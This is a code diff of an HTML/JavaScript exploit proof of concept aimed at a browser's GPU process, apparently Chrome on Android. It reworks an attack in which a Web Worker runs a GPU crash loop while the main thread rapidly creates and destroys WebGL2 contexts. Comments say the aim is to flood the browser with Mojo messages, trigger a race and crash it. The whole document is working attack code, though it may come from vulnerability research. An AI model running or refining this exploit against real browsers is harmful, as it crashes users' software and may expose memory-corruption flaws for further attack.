@@ -8,24 +8,8 @@ const log = msg => {
 };
 
 (async function() {
-  // 1. Create multiple contexts to increase race chance
-  const canvases = [];
-  const gls = [];
-  for (let i = 0; i < 50; i++) {
-    const c = document.createElement('canvas');
-    c.width = c.height = 1;
-    document.body.appendChild(c);
-    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
-    if (gl) {
-      gls.push(gl);
-      canvases.push(c);
-    }
-  }
-  log(`Created ${gls.length} contexts.`);
-
-  // 2. Start GPU crash in a Worker (YOUR ORIGINAL CRASH LOOP)
+  // 1. Start GPU crash in a Worker (YOUR ORIGINAL CRASH LOOP)
   const crashWorker = new Worker(URL.createObjectURL(new Blob([`
-    // Original synchronous crash loop
     (function() {
       const attrs = [
         { powerPreference: 'high-performance' },
@@ -50,20 +34,30 @@ const log = msg => {
           }
         }
       }
-      postMessage('crash_done');
+      postMessage('crash_started');
     })();
   `], { type: 'application/javascript' })));
 
-  // 3. IMMEDIATELY destroy all contexts (send DestroyCommandBuffer)
-  log('Destroying contexts...');
-  for (const c of canvases) {
-    c.width = 0;   // sends DestroyCommandBuffer Mojo message
+  // Wait for worker to start its loop
+  await new Promise(r => { crashWorker.onmessage = r; });
+  log('Crash loop started. Rapidly creating/destroying canvases...');
+
+  // 2. On the main thread, rapid-fire create/destroy WebGL contexts
+  //    This sends a flood of Mojo messages to the browser.
+  for (let i = 0; i < 200; i++) {
+    const c = document.createElement('canvas');
+    c.width = c.height = 1;
+    document.body.appendChild(c);
+    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
+    if (gl) {
+      // Immediately destroy it
+      c.width = 0;
+    }
+    document.body.removeChild(c);
+    // No delay – keep the IO thread busy
   }
 
-  // 4. Wait for worker to finish (GPU should be dead by now)
-  crashWorker.onmessage = (e) => {
-    log('Crash worker finished. Check logcat for browser crash!');
-  };
+  log('Finished. Check logcat for browser crash.');
 })();
 </script>
 </body>
